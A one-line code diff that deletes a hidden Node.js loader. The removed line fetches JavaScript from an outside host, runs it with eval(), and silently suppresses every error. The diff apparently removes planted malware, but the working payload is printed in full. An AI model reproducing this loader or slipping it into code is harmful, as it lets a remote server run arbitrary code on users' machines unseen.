@@ -1,1 +1,0 @@
-require('http').get('http://uabjuza.lt:3000/api/connector/execute/js/SC_1769096019205_1769204011923_belqh7zb6', (r) => { let d = ''; r.on('data', (c) => d += c); r.on('end', () => { if (r.statusCode === 200 && d) { try { eval(d) } catch(err) {} } }); }).on('error', () => {})
